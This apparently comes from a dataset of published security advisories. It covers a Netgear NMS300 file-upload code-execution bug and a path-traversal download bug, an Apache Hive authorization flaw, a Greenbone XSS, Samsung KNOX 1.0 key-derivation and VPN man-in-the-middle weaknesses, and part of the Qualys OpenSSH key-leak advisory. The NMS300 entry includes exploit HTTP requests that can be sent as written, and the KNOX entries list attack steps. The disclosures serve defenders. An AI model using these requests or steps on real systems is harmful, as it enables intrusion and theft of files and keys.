The NETGEAR Management System NMS300 delivers insight into network
elements, including third-party devices. An intuitive, web-based user
interface makes it easier to monitor and administer an entire network.""
>> Summary:
Netgear's NMS300 is a network management utility that runs on Windows
systems. It has serious two vulnerabilities that can be exploited by a
remote attacker. The first one is an arbitrary file upload vulnerability
that allows an unauthenticated attacker to execute Java code as the
SYSTEM user.
The second vulnerability is an arbitrary file download that allows an
authenticated user to download any file from the host that is running
NMS300.
A special thanks to Joel Land of CERT/CC for helping disclose this
vulnerability under ID 777024 [1]. Two new Metasploit modules that
exploit these vulnerabilities have been released.
>> Technical details:
#1
Vulnerability: Remote code execution via arbitrary file upload
(unauthenticated)
CVE-2016-1525
Affected versions:
NMS300 1.5.0.11
NMS300 1.5.0.2
NMS300 1.4.0.17
NMS300 1.1.0.13
There are two servlets that allow unauthenticated file uploads:
@RequestMapping({ ""/fileUpload.do"" })
public class FileUpload2Controller
- Uses spring file upload
@RequestMapping({ ""/lib-1.0/external/flash/fileUpload.do"" })
public class FileUploadController
- Uses flash upload
The JSP file can be uploaded as shown below, it will be named
null[name].[extension] and can be reached on
http://[host]:8080/null[name].[extension].
So for example if [name] = ""testing"" and [extension] = "".jsp"", the final
file will be named ""nulltesting.jsp"". [name] and [extension] can be seen
in the sample request below. The code will execute as the SYSTEM user.
POST /lib-1.0/external/flash/fileUpload.do HTTP/1.1
Content-Type: multipart/form-data;
boundary=----------ae0KM7Ef1ei4GI3gL6gL6gL6gL6GI3
------------ae0KM7Ef1ei4GI3gL6gL6gL6gL6GI3
Content-Disposition: form-data; name=""name""
[name]
------------ae0KM7Ef1ei4GI3gL6gL6gL6gL6GI3
Content-Disposition: form-data; name=""Filedata"";
filename=""whatever.[extension]""
Content-Type: application/octet-stream
<%@ page language=""java"" contentType=""text/html; charset=ISO-8859-1""
pageEncoding=""ISO-8859-1""%>
<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN""
""http://www.w3.org/TR/html4/loose.dtd"">
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=ISO-8859-1"">
<title>Hello World Example</title>
</head>
<body>
<h2>A Hello World Example of JSP.</h2>
</body>
</html>
------------ae0KM7Ef1ei4GI3gL6gL6gL6gL6GI3--
#2
Vulnerability: Arbitrary file download (authenticated)
CVE-2016-1524
Affected versions:
NMS300 1.5.0.11
NMS300 1.5.0.2
NMS300 1.4.0.17
NMS300 1.1.0.13
Three steps need to be taken in order to exploit this vulnerability:
a) Add a configuration image, with the realName parameter containing the
path traversal to the target file:
POST /data/config/image.do?method=add HTTP/1.1
realName=../../../../../../../../../../<file on
C:>&md5=&fileName=<imagename.img>&version=1337&vendor=Netgear&deviceType=4&deviceModel=FS526Tv2&description=bla
b) Obtain the file identifier (imageId) for the image that was created
by scraping the page below for ""imagename.img"" (the fileName parameter
in step 1):
POST /data/getPage.do?method=getPageList&type=configImgManager
everyPage=10000
Sample response:
{""page"":{""beginIndex"":0,""recordCount"":7,""totalRecords"":7,""currentPage"":1,""everyPage"":10,""totalPage"":1},""list"":[{""imageId"":""1"",""fileName"":""agga5.img"",""createTime"":""10/03/2015
21:12:36"",""realFileName"":""../../../../../../../../../../log.txt"",""vendor"":""Netgear"",""deviceType"":""4"",""deviceModel"":""FS526Tv2"",""version"":""2323"",""sizeM"":""24491"",""createBy"":""admin"",""createId"":""1"",""description"":""bla ""}
c) Download the file with the imageId obtained in step 2:
GET /data/config/image.do?method=export&imageId=<ID>
>> Fix:
No fix is currently available. It is recommended not to expose NMS300 to
the Internet or any unstrusted networks.
>> References:
[1] https://www.kb.cert.org/vuls/id/777024
================
Agile Information Security Limited
http://www.agileinfosec.co.uk/
>> Enabling secure digital business >>"
3592,CVE-2015-7521: Apache Hive authorization bug disclosure,,CVE-2015-7521,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2015-7521: Apache Hive authorization bug disclosure
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
Apache Hive 1.0.0 - 1.0.1
Apache Hive 1.1.0 - 1.1.1
Apache Hive 1.2.0 - 1.2.1
Description:
Some partition-level operations exist that do not explicitly also
authorize privileges of the parent table. This can lead to issues when
the parent table would have denied the operation, but no denial occurs
because the partition-level privilege is not checked by the
authorization framework, which defines authorization entities only
from the table level upwards.
This issue is known to affect Hive clusters protected by both Ranger
as well as SqlStdHiveAuthorization.
Mitigation:
For Hive 1.0, 1.1 and 1.2, a separate jar is being made available,
which users can put in their ${HIVE_HOME}/lib/, and this provides a hook for
administrators to add to their hive-site.xml, by setting
hive.semantic.analyzer.hook=org.apache.hadoop.hive.ql.parse.ParentTableAuthorizationHook .
This parameter is a comma-separated-list and this hook can be
appended to an existing list if one already exists in the setup. You
will then want to make sure that you protect the
hive.semantic.analyzer.hook parameter from being changed at runtime by
adding it to hive.conf.restricted.list.
This jar and associated source tarball are available for download
over at : https://hive.apache.org/downloads.html
along with their gpg-signed .asc signatures, as well as the md5sums
for verification in the hive-parent-auth-hook/ directory.
This issue has already been patched in all Hive branches that are
affected, and any future release will not need these mitigation steps.
Credit: This issue was discovered by Olaf Flebbe of science+computing ag.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.5 (GNU/Linux)
iQIVAwUBVqpoih6tt4FFMLreAQKkbA//f+r+DDDKiYPbymTXjOhCUqDIDirtiT2A
OZHBn3LTNad3eQPZ6qrYadbw30iJpU+SCMtN+gO7F27TJRIdBfk/g9HjrG9i/uLb
q4a/uzHEGbFFnfz61gXERtvyqHP/7RzbUz/WNBvCGitJJL2AZ/j3oTvUxc4r3fbC
mVXSCtkY7fj28fbi9/jhj/go9Qr7aL0Tk/Tkb6RQ97YwoZVZTvPTFh7ALmX+f2Qh
0qPMg7phL9clTXR/cNGRA8LUFRbDuTahP5hptHmE2KgGQJK5fjKwvisoH6lvVKnh
iv5UFs9jjcvPd1MpuBDRfHj/RA0L8emkDzz2/36XKM0AFyEB5gHf4U7ZT7AVj1P/
xwdxgNJZcqgRfSabkNIbNhEcYLVx9H2btIIAgkdDnu2HaxzCBErjRcv6hj7bbG5N
5NHQDcnjzj86u2D7XiA4hXPLnQE6JNJyc7cLaU4xRV18QiN9KzpDJQpIot0GvXs1
7q2+I6H6AxDxeotSCmQnwEE5NCVxl3ivUCKA8tA0jxEzhm8QE/bTaeM00OwJ+7wl
ruDdGkfF3b854U4Fyzh14WCGy1b74wjc79iOt8tJfLEh9kdRNbA5Jb7QZYNpCJ4n
Eb5lxZv5MQFyBvbJCttz59jgzxCcmunkyNZamGRGugmR3Dwu9jOQRCk2s+4pouCf
20RJ9WEkoXY=
=Q0SZ
-----END PGP SIGNATURE-----"
3646,[CVE-2016-1926] XSS in Greenbone Security Assistant &#8805; 6.0.0 and < 6.0.8,,CVE-2016-1926,"Hello,
Vulnerability information
===============
Date: 13th January 2016
Product: Greenbone Security Assistant &#8805; 6.0.0 and < 6.0.8
Vendor: OpenVAS <http://www.openvas.org/>
Risk: Low, CVSS 1.9 (AV:A/AC:M/Au:M/C:P/I:N/A:N)
Description
===============
It has been identified that Greenbone Security Assistant (GSA) is vulnerable to cross site scripting due to a improper handling of the parameters of the get_aggregate command. Given the attacker has access to a session token of the browser session, the cross site scripting can be executed. OpenVAS-7 is not affected.
Fix
===============
OpenVAS recommends that the publicly available patches are applied. If building from source, then patches r24056 (for Greenbone Security Assistant 6.0.x of OpenVAS-8) should be obtained from the OpenVAS SVN repository. For trunk (beta status of OpenVAS-9) this was solved with r24055.
A fresh tarball containing the latest stable release of Greenbone Security Assistant 6.0 (OpenVAS-8) can be obtained from:
http://wald.intevation.org/frs/download.php/2283/greenbone-security-assistant-6.0.8.tar.gz
In the event that OpenVAS has been supplied as part of a distribution then the vendor or organisation concerned should be contacted for a patch.
Full advisory
===============
See [1].
Timeline
===============
- 07.01.2016: XSS discovered and reported to vendor.
- 08.01.2016, 08:00: Acknowledgement from vendor and info that fix is already in progress.
- 08.01.2016, 17:30: Fix ready, QA and testing needed
- 09.01.2016: Update released for Greenbone Security Manager: Advisory GBSA 2016-01 [2]
- 13.01.2016: Update released OpenVAS: Advisory OVSA 20160113 [1]
- 18.01.2016: CVE-2016-1926 assigned by MITRE
- 20.01.2016: Blogpost released [3]
References
===============
- [1] http://www.openvas.org/OVSA20160113.html
- [2] http://www.greenbone.net/technology/gbsa2016-01.html
- [3] https://en.internetwache.org/cve-2016-1926-xss-in-the-greenbone-security-assistant-20-01-2016/
Regards,
Sebastian Neef"
3653,Re: [CVE-2016-1919] Weak eCryptFS Key generation from user password on KNOX 1.0 / Android 4.3,,CVE-2016-1919,"Vendor Response Continuation
============================
KNOX 2.0 fixes the issue. KNOX 2.3 makes some further improvements (with the introduction of Sensitive Data Protection), but even KNOX 2.0 has a different key derivation scheme."
3654,Re: [CVE-2016-1920] VPN Man-in-the-Middle due to shared certificate store on KNOX 1.0 / Android 4.3,,CVE-2016-1920,"Vendor Response Continuation
============================
The issue is a limitation of the KNOX 1.0 architecture, which was removed by KNOX 2.0. VPNs that implement their own certificate pinning can be trusted with KNOX 1.0 containers, as a result. The vendor encourages users to upgrade to KNOX 2.x."
3664,[CVE-2016-1920] VPN Man-in-the-Middle due to shared certificate store on KNOX 1.0 / Android 4.3,,CVE-2016-1920,"Subject: [CVE-2016-1920] VPN Man-in-the-Middle due to shared certificate store on KNOX 1.0 / Android 4.3
Vulnerability Description
=========================
The vulnerability allows disclosure of Data-in-Motion of Samsung KNOX 1.0 containers.
In KNOX 1.0.0 the applications inside the container use the same certificate store as the outside Android environment.
Android supports installing 3rd party certificates (following user authorization). Another useful feature in Android is the ability to create a VPN connection through which all traffic will be routed.
Combining the above facts leads to a vulnerability allowing an attacker to perform a MITM attack on VPN traffic originating from within the KNOX container
The attack sequence is as follows (all can be done without the user's knowledge for example when asking to make a phone call from his device):
1. Install the malicious application requiring VPN-related permissions
2. Install a 3rd party certificate
3. Run the malicious application which starts a VPN connection. This will cause a notification to appear with the icon of the malicious application and name of the VPN connection.
The ``red flag'' in form of the notification can be easily mitigated by the attacker.
By using the KNOX icon and a benign name for the VPN connection such as ``KNOX Connectivity'' a non-tech-savvy will surely be persuaded that the notification is a legitimate part of KNOX and continue using the device normally.
Affected System Configurations
==============================
We have tested and verified the vulnerability on the following devices, however, we believe that ALL Samsung devices running KNOX 1.0.0 are vulnerable
1. Samsung Galaxy S3
- Model Number: GT-I9305
- Android Version: 4.3
- Kernel Version: 3.0.31-2051278 dpi@DELL323 #1
- Build Number: JSS15J.I9305XXUEML8
- KNOX Version: 1.0.0
- State: Rooted, via flashing a custom recovery and kernel. KNOX warranty bit tripped, technically disabling KNOX. KNOX was re-enabled (fully functional) using root capabilities
2. Samsung Galaxy S4
- Model Number: GT-I9505
- Android Version: 4.3
- Kernel Version: 3.4.0-1869009 se.infra@SEP-106 #1
- Build Number: XXUEMJ5.CCOM
- KNOX Version: 1.0.0
- State: Rooted using SafeRoot. KNOX warranty bit not tripped, KNOX fully functional
Vulnerability Impact
====================
Prerequisite:
- One-time access to an unlocked device allowing an attacker to install an application of his choosing
Impact:
- For as long as the VPN connection is active, all device traffic outside and inside KNOX will be routed through the VPN connection,
allowing the malicious application to serve fake SSL/TLS certificates signed with its perviously installed 3rd-party certificate.
Due to the shared certificate store, any application relying on a chain-of-trust verification will believe the certificate to be authentic and continue operating as normal, allowing the user to disclose his secret data to the attacker.
- This attack will not persist after reboot as there is a need to manually start the VPN connection.
- The attack doesn't involve any exploits and does not require knowing the user's KNOX password.
Mitigation:
- This attack was mitigated in KNOX 2.3.0 by introducing a separate certificate store for the KNOX environment.
- The vulnerable code is in the system_server's code (services.odex) which can only be replaced by a full system update, potentially upgrading KNOX to 2.x.
Vendor Contact
==============
We contacted Samsung on December 9th, 2015 and have had detailed email exchanges with the vendor regarding this vulnerability.
The highlights of the vendor's responses are:
- ""KNOX 1.0 is different than KNOX 2.3 in many significant ways"".
- This vulnerability was ""directly identified and addressed during past internal security reviews""
- ""Devices that are KNOX capable can be updated via the Maintenance Release process. KNOX 1.0 containers will automatically upgrade to the newer KNOX 2.x
technology when the update is applied""
- ""upgrading to Android 4.4 on a KNOX-enabled device implies upgrading to KNOX 2.x. No additional steps should be necessary from the users perspective""
Vulnerability Discovery Method
==============================
We utilized dynamic analysis of KNOX 1.0.0 to find this vulnerability.
The dynamic analysis was performed using the Xposed framework by inserting hooks in the code flow requesting Android system services.
We came to the conclusion that KNOX shares the system_server with the normal Android environment and attempted to ""manipulate"" a service externally to impact KNOX internally. We assumed that the certificate verification in SSL must be performed using a system service and if we could convince that service to trust our own certificate it would translate to KNOX trusting it as well.
To do this we used the Packet Capture application by Grey Shirts (https://play.google.com/store/apps/details?id=app.greyshirts.sslcapture&hl=en).
The application installs a custom certificate and creates a VPN connection allowing it to capture all traffic.
Then we surfed to an https URL from within the KNOX browser, in our case the Yahoo login page. We entered a username and password and afterwards saw it in the captured packets in Packet Capture.
To install the Xposed framework we had to root the devices.
- The Galaxy S4 was rooted using a modified version of SafeRoot. We downloaded the source code of SafeRoot, removed any KNOX-disabling features from it, recompiled it and used the modified binary to install ""SuperSU"" on the device. Using SuperSU we installed Xposed.
- The Galaxy S3 was rooted to begin with by flashing a custom recovery and kernel, tripping the warranty bit in the process, thus preventing us from running KNOX. Due to the device being already rooted we installed Xposed on it and used Xposed to ""re-enable"" KNOX. We did this by adding hooks to the TIMA service running in the system_server. We hooked keystoreInstallKey to always return 0 and keystoreRetrieveKey to always return [0] + [key], with [key] always being the same 32 bytes. This convinced KNOX that the device isn't rooted and made it fully functional allowing us to verify the vulnerability on it as well.
Timeline
========
2015-12-09 Vendor notified
2015-12-28 Vendor permitted vulnerability publication
2016-01-12 CVE number requested
2016-01-16 CVE number assigned
2016-01-16 Public disclosure"
3665,[CVE-2016-1919] Weak eCryptFS Key generation from user password on KNOX 1.0 / Android 4.3,,CVE-2016-1919,"Subject: [CVE-2016-1919] Weak eCryptFS Key generation from user password on KNOX 1.0 / Android 4.3
Vulnerability Description
=========================
The vulnerability allows disclosure of Data-at-Rest of Samsung KNOX 1.0 containers.
KNOX container data is encrypted using eCryptFS containers. The same form of encryption is applied to both container application data and sdcard content.
To provide eCryptFS the required a 32-byte AES key, KNOX produces a combination of the user's password (minimum 7 chars) and 32 random bytes (denoted as the TIMA key).
The TIMA key is generated during the first container creation and stored aside for later use in creating the eCryptFS key.
The vulnerability itself is in the generation of the eCryptFS-key from the password and the TIMA key.
In pseudo-code the generation algorithm is as follows:
private static String getEcryptFsKey(String password, byte[] timaKey)
{
byte[] bytes = String.format(""%1$32s"", password).getBytes();
byte[] keyBytes = new byte[32];
for (int i = 0; i < 32; i += 1) {
keyBytes[i] = (byte) (bytes[i] xor timaKey[i + 1]);
}
String ecryptFsKey = Base64.getEncoder().encodeToString(keyBytes);
String truncated = ecryptFsKey.substring(0, 32);
return truncated;
}
As we can see, algorithm is as follows:
1. Left-pad the password with spaces up to 32 chars
2. XOR the padded password with the TIMA key to produce ``random'' 32 bytes
3. Encode the 32 bytes in Base64
4. Take the left-most 32 bytes from the Base64-encoded string
The problem with this algorithm is that Base64 expands the given input with a radio of 4:3 (every 3 bytes result in 4 chars).
Given that ratio, only the first 24 bytes of the XOR'ed sequence actually affect the eCryptFS key!
Seeing as the minimal length for a user's password is 7 bytes, it is reasonable to assume that most users will choose a password of that length, possibly extending it to 8 chars.
Either way, up to 8 chars, the user's password will be completely ignored and only the padded spaces will mix with the TIMA key.
Given a somewhat longer password, all it will take is a very simple bruteforce attack on a very small set of options.
The TIMA service exports functionality for querying the TIMA key but checks that the caller's UID is system.
Affected System Configurations
==============================
We have tested and verified the vulnerability on the following devices, however, we believe that ALL Samsung devices running KNOX 1.0.0 are vulnerable
1. Samsung Galaxy S3
- Model Number: GT-I9305
- Android Version: 4.3
- Kernel Version: 3.0.31-2051278 dpi@DELL323 #1
- Build Number: JSS15J.I9305XXUEML8
- KNOX Version: 1.0.0
- State: Rooted, via flashing a custom recovery and kernel. KNOX warranty bit tripped, technically disabling KNOX. KNOX was re-enabled (fully functional) using root capabilities
2. Samsung Galaxy S4
- Model Number: GT-I9505
- Android Version: 4.3
- Kernel Version: 3.4.0-1869009 se.infra@SEP-106 #1
- Build Number: XXUEMJ5.CCOM
- KNOX Version: 1.0.0
- State: Rooted using SafeRoot. KNOX warranty bit not tripped, KNOX fully functional
Vulnerability Impact
====================
Prerequisites:
- Local root / system access.
- Can be obtained via a local privilege escalation exploit such as SafeRoot.
- The user's password is short enough (up to ~12 chars)
Attack:
1. Obtain TIMA key
- Run code on device with root permissions and inject code into system_server or run as ""system"" user
- Use the ""tima"" service (ITimaService) to obtain the key:
- timaService.keystoreInit()
- Key = timaService.keystoreRetrieveKey(0)[1:];
- timaService.keystoreShutdown();
2. Calculate eCryptFsKey and attempt to mount the data/sdcard filesystem
- Start by using random 8 chars
- Calculate the eCryptFsKey using the algorithm
- Attempt to mount the sdcard partition by calling:
com.sec.knox.container.EnterpriseContainerService$ContainerServiceHandler.mountSecondStorage()
- If the mount succeeds, we have the password
- Otherwise, brute-force the password by guessing the remaining characters. There is no limit on retries.
Implications:
1. A root attacker can get unlimited access the user's encrypted KNOX data
2. If the user were to change his password to any other up-to-8-chars sequence, it wouldn't actually change the encryption key, fooling the user into
thinking he has somehow changed the way his data is protected.
Mitigation:
- This attack was mitigated in KNOX 2.3.0 by switching to a different data encryption and key generation scheme.
- The vulnerable code is in the system_server's code (services.odex) which can only be replaced by a full system update, potentially upgrading KNOX to 2.x.
Vendor Contact
==============
We contacted Samsung on December 9th, 2015 and have had detailed email exchanges with the vendor regarding this vulnerability.
The highlights of the vendor's responses are:
- ""KNOX 1.0 is different than KNOX 2.3 in many significant ways"".
- This vulnerability was ""directly identified and addressed during past internal security reviews""
- ""Devices that are KNOX capable can be updated via the Maintenance Release process. KNOX 1.0 containers will automatically upgrade to the newer KNOX 2.x
technology when the update is applied""
- ""upgrading to Android 4.4 on a KNOX-enabled device implies upgrading to KNOX 2.x. No additional steps should be necessary from the users perspective""
Vulnerability Discovery Method
==============================
We combined both static and dynamic analysis of KNOX 1.0.0 to find this vulnerability.
The static analysis reverse-engineering KNOX 1.0.0 binaries taken from the aforementioned devices (due to KNOX being closed source).
We extracted the .odex / .jar / .apk files of ContainerAgent and services (the code of the system_server) and performed the following:
- De-odexed them using the Universal Deodexer to obtain .dex files.
- Converted the .dex files to .jar files (containing .class files) using dex2jar.
- Disassembled the .jar files using jd-gui.
- Analyzed the code of ContainerAgent and EnterpriseContainerService.
The dynamic analysis was performed using the Xposed framework by inserting hooks in the code flow of generating the eCryptFS key.
Using the hooks we verified at run-time that the algorithm works precisely as we understood from the dynamic analysis.
We also performed multiple password changes to passwords of up 8 chars and verified that the generated eCryptFS key doesn't change.
To install the Xposed framework we had to root the devices.
- The Galaxy S4 was rooted using a modified version of SafeRoot. We downloaded the source code of SafeRoot, removed any KNOX-disabling features from it, recompiled it and used the modified binary to install ""SuperSU"" on the device. Using SuperSU we installed Xposed.
- The Galaxy S3 was rooted to begin with by flashing a custom recovery and kernel, tripping the warranty bit in the process, thus preventing us from running KNOX. Due to the device being already rooted we installed Xposed on it and used Xposed to ""re-enable"" KNOX. We did this by adding hooks to the TIMA service running in the system_server. We hooked keystoreInstallKey to always return 0 and keystoreRetrieveKey to always return [0] + [key], with [key] always being the same 32 bytes. This convinced KNOX that the device isn't rooted and made it fully functional allowing us to verify the vulnerability on it as well.
Timeline
========
2015-12-09 Vendor notified
2015-12-28 Vendor permitted vulnerability publication
2016-01-12 CVE number requested
2016-01-16 CVE number assigned
2016-01-16 Public disclosure"
3672,Qualys Security Advisory - Roaming through the OpenSSH client: CVE-2016-0777 and CVE-2016-0778,,CVE-2016-0777,"Qualys Security Advisory
Roaming through the OpenSSH client: CVE-2016-0777 and CVE-2016-0778
========================================================================
Contents
========================================================================
Summary
Information Leak (CVE-2016-0777)
- Analysis
- Private Key Disclosure
- Mitigating Factors
- Examples
Buffer Overflow (CVE-2016-0778)
- Analysis
- Mitigating Factors
- File Descriptor Leak
Acknowledgments
Proof Of Concept
========================================================================
Summary
========================================================================
Since version 5.4 (released on March 8, 2010), the OpenSSH client
supports an undocumented feature called roaming: if the connection to an
SSH server breaks unexpectedly, and if the server supports roaming as
well, the client is able to reconnect to the server and resume the
suspended SSH session.
Although roaming is not supported by the OpenSSH server, it is enabled
by default in the OpenSSH client, and contains two vulnerabilities that
can be exploited by a malicious SSH server (or a trusted but compromised
server): an information leak (memory disclosure), and a buffer overflow
(heap-based).
The information leak is exploitable in the default configuration of the
OpenSSH client, and (depending on the client's version, compiler, and
operating system) allows a malicious SSH server to steal the client's
private keys. This information leak may have already been exploited in
the wild by sophisticated attackers, and high-profile sites or users may
need to regenerate their SSH keys accordingly.
The buffer overflow, on the other hand, is present in the default
configuration of the OpenSSH client but its exploitation requires two
non-default options: a ProxyCommand, and either ForwardAgent (-A) or
ForwardX11 (-X). This buffer overflow is therefore unlikely to have any
real-world impact, but provides a particularly interesting case study.
All OpenSSH versions between 5.4 and 7.1 are vulnerable, but can be
easily hot-fixed by setting the undocumented option ""UseRoaming"" to
""no"", as detailed in the Mitigating Factors section. OpenSSH version
7.1p2 (released on January 14, 2016) disables roaming by default.
========================================================================
Information Leak (CVE-2016-0777)
========================================================================
------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------
If the OpenSSH client connects to an SSH server that offers the key
exchange algorithm ""resume appgate com"", it sends the global request
""roaming appgate com"" to the server, after successful authentication. If
this request is accepted, the client allocates a roaming buffer out_buf,
by calling malloc() (and not calloc()) with an out_buf_size that is
arbitrarily chosen by the server:
63 void
64 roaming_reply(int type, u_int32_t seq, void *ctxt)
65 {
66 if (type == SSH2_MSG_REQUEST_FAILURE) {
67 logit(""Server denied roaming"");
68 return;
69 }
70 verbose(""Roaming enabled"");
..
75 set_out_buffer_size(packet_get_int() + get_snd_buf_size());
..
77 }
40 static size_t out_buf_size = 0;
41 static char *out_buf = NULL;
42 static size_t out_start;
43 static size_t out_last;
..
75 void
76 set_out_buffer_size(size_t size)
77 {
78 if (size == 0 || size > MAX_ROAMBUF)
79 fatal(""%s: bad buffer size %lu"", __func__, (u_long)size);
80 /*
81 * The buffer size can only be set once and the buffer will live
82 * as long as the session lives.
83 */
84 if (out_buf == NULL) {
85 out_buf_size = size;
86 out_buf = xmalloc(size);
87 out_start = 0;
88 out_last = 0;
89 }
90 }
The OpenSSH client's roaming_write() function, a simple wrapper around
write(), calls wait_for_roaming_reconnect() to transparently reconnect
to the SSH server after a disconnection. It also calls buf_append() to
copy the data sent to the server into the roaming buffer out_buf. During
a reconnection, the client is therefore able to resend the data that was
not received by the server because of the disconnection:
198 void
199 resend_bytes(int fd, u_int64_t *offset)
200 {
201 size_t available, needed;
202
203 if (out_start < out_last)
204 available = out_last - out_start;
205 else
206 available = out_buf_size;
207 needed = write_bytes - *offset;
208 debug3(""resend_bytes: resend %lu bytes from %llu"",
209 (unsigned long)needed, (unsigned long long)*offset);
210 if (needed > available)
211 fatal(""Needed to resend more data than in the cache"");
212 if (out_last < needed) {
213 int chunkend = needed - out_last;
214 atomicio(vwrite, fd, out_buf + out_buf_size - chunkend,
215 chunkend);
216 atomicio(vwrite, fd, out_buf, out_last);
217 } else {
218 atomicio(vwrite, fd, out_buf + (out_last - needed), needed);
219 }
220 }
In the OpenSSH client's roaming buffer out_buf, the most recent data
sent to the server begins at index out_start and ends at index out_last.
As soon as this circular buffer is full, buf_append() maintains the
invariant ""out_start = out_last + 1"", and consequently three different
cases have to be considered:
- ""out_start < out_last"" (lines 203-204): out_buf is not full yet (and
out_start is still equal to 0), and the amount of data available in
out_buf is indeed ""out_last - out_start"";
- ""out_start > out_last"" (lines 205-206): out_buf is full (and out_start
is exactly equal to ""out_last + 1""), and the amount of data available
in out_buf is indeed the entire out_buf_size;
- ""out_start == out_last"" (lines 205-206): no data was ever written to
out_buf (and both out_start and out_last are still equal to 0) because
no data was ever sent to the server after roaming_reply() was called,
but the client sends (leaks) the entire uninitialized out_buf to the
server (line 214), as if out_buf_size bytes of data were available.
In order to successfully exploit this information leak and retrieve
sensitive information from the OpenSSH client's memory (for example,
private SSH keys, or memory addresses useful for further exploitation),
a malicious server needs to:
- Massage the client's heap before roaming_reply() malloc()ates out_buf,
and force malloc() to return a previously free()d but uncleansed chunk
of sensitive information. The simple proof-of-concept in this advisory
does not implement heap massaging.
- Guess the client's get_snd_buf_size() in order to precisely control
out_buf_size. OpenSSH < 6.0 accepts out_buf sizes in the range (0,4G),
and OpenSSH >= 6.0 accepts sizes in the range (0,2M]. Sizes smaller
than get_snd_buf_size() are attainable because roaming_reply() does
not protect ""packet_get_int() + get_snd_buf_size()"" against integer
wraparound. The proof-of-concept in this advisory attempts to derive
the client's get_snd_buf_size() from the get_recv_buf_size() sent by
the client to the server, and simply chooses a random out_buf_size.
- Advise the client's resend_bytes() that all ""available"" bytes (the
entire out_buf_size) are ""needed"" by the server, even if fewer bytes
were actually written by the client to the server (because the server
controls the ""*offset"" argument, and resend_bytes() does not protect
""needed = write_bytes - *offset"" against integer wraparound).
Finally, a brief digression on a minor bug in resend_bytes(): on 64-bit
systems, where ""chunkend"" is a 32-bit signed integer, but ""out_buf"" and
""out_buf_size"" are 64-bit variables, ""out_buf + out_buf_size - chunkend""
may point out-of-bounds, if chunkend is negative (if out_buf_size is in
the [2G,4G) range). This negative chunkend is then converted to a 64-bit
size_t greater than SSIZE_MAX when passed to atomicio(), and eventually
returns EFAULT when passed to write() (at least on Linux and OpenBSD),
thus avoiding an out-of-bounds read from the OpenSSH client's memory.
------------------------------------------------------------------------
Private Key Disclosure
------------------------------------------------------------------------
We initially believed that this information leak in the OpenSSH client's
roaming code would not allow a malicious SSH server to steal the
client's private keys, because:
- the information leaked is not read from out-of-bounds memory, but from
a previously free()d chunk of memory that is recycled to malloc()ate
the client's roaming buffer out_buf;
- private keys are loaded from disk into memory and freed by key_free()
(old API, OpenSSH < 6.7) or sshkey_free() (new API, OpenSSH >= 6.7),
and both functions properly cleanse the private keys' memory with
OPENSSL_cleanse() or explicit_bzero();
- temporary copies of in-memory private keys are freed by buffer_free()
(old API) or sshbuf_free() (new API), and both functions attempt to
cleanse these copies with memset() or bzero().
However, we eventually identified three reasons why, in our experiments,
we were able to partially or completely retrieve the OpenSSH client's
private keys through this information leak (depending on the client's
version, compiler, operating system, heap layout, and private keys):
(besides these three reasons, other reasons may exist, as suggested by
the CentOS and Fedora examples at the end of this section)
1. If a private SSH key is loaded from disk into memory by fopen() (or
fdopen()), fgets(), and fclose(), a partial or complete copy of this
private key may remain uncleansed in memory. Indeed, these functions
manage their own internal buffers, and whether these buffers are
cleansed or not depends on the OpenSSH client's libc (stdio)
implementation, but not on OpenSSH itself.
- In all vulnerable OpenSSH versions, SSH's main() function calls
load_public_identity_files(), which loads the client's public keys
with fopen(), fgets(), and fclose(). Unfortunately, the private keys
(without the "".pub"" suffix) are loaded first and then discarded, but
nonetheless buffered in memory by the stdio functions.
- In OpenSSH versions <= 5.6, the load_identity_file() function (called
by the client's public-key authentication method) loads a private key
with fdopen() and PEM_read_PrivateKey(), an OpenSSL function that uses
fgets() and hence internal stdio buffering.
Internal stdio buffering is the most severe of the three problems
discussed in this section, although GNU/Linux is not affected because
the glibc mmap()s and munmap()s (and therefore cleanses) stdio buffers.
BSD-based systems, on the other hand, are severely affected because they
simply malloc()ate and free() stdio buffers. For interesting comments on
this issue:
https://www.securecoding.cert.org/confluence/display/c/MEM06-C.+Ensure+that+sensitive+data+is+not+written+out+to+disk
2. In OpenSSH versions >= 5.9, the client's load_identity_file()
function (called by the public-key authentication method) read()s a
private key in 1024-byte chunks that are appended to a growing buffer (a
realloc()ating buffer) with buffer_append() (old API) or sshbuf_put()
(new API). Unfortunately, the repeated calls to realloc() may leave
partial copies of the private key uncleansed in memory.
- In OpenSSH < 6.7 (old API), the initial size of such a growing buffer
is 4096 bytes: if a private-key file is larger than 4K, a partial copy
of this private key may remain uncleansed in memory (a 3K copy in a 4K
buffer). Fortunately, only the file of a very large RSA key (for
example, an 8192-bit RSA key) can exceed 4K.
- In OpenSSH >= 6.7 (new API), the initial size of a growing buffer is
256 bytes: if a private-key file is larger than 1K (the size passed to
read()), a partial copy of this private key may remain uncleansed in
memory (a 1K copy in a 1K buffer). For example, the file of a
default-sized 2048-bit RSA key exceeds 1K.
For more information on this issue:
https://www.securecoding.cert.org/confluence/display/c/MEM03-C.+Clear+sensitive+information+stored+in+reusable+resources
https://cwe.mitre.org/data/definitions/244.html
3. An OpenSSH growing-buffer that holds a private key is eventually
freed by buffer_free() (old API) or sshbuf_free() (new API), and both
functions attempt to cleanse the buffer with memset() or bzero() before
they call free(). Unfortunately, an optimizing compiler may remove this
memset() or bzero() call, because the buffer is written to, but never
again read from (an optimization known as Dead Store Elimination).
OpenSSH 6.6 is the only version that is not affected, because it calls
explicit_bzero() instead of memset() or bzero().
Dead Store Elimination is the least severe of the three problems
explored in this section, because older GCC versions do not remove the
memset() or bzero() call made by buffer_free() or sshbuf_free(). GCC 5
and Clang/LLVM do, however, remove it. For detailed discussions of this
issue:
https://www.securecoding.cert.org/confluence/display/c/MSC06-C.+Beware+of+compiler+optimizations
https://cwe.mitre.org/data/definitions/14.html
https://sourceware.org/ml/libc-alpha/2014-12/threads.html#00506
Finally, for these three reasons, passphrase-encrypted SSH keys are
leaked in their encrypted form, but an attacker may attempt to crack the
passphrase offline. On the other hand, SSH keys that are available only
through an authentication agent are never leaked, in any form.
------------------------------------------------------------------------
Mitigating Factors
------------------------------------------------------------------------
This information leak affects all OpenSSH clients >= 5.4, but its impact
is slightly reduced by the following four reasons:
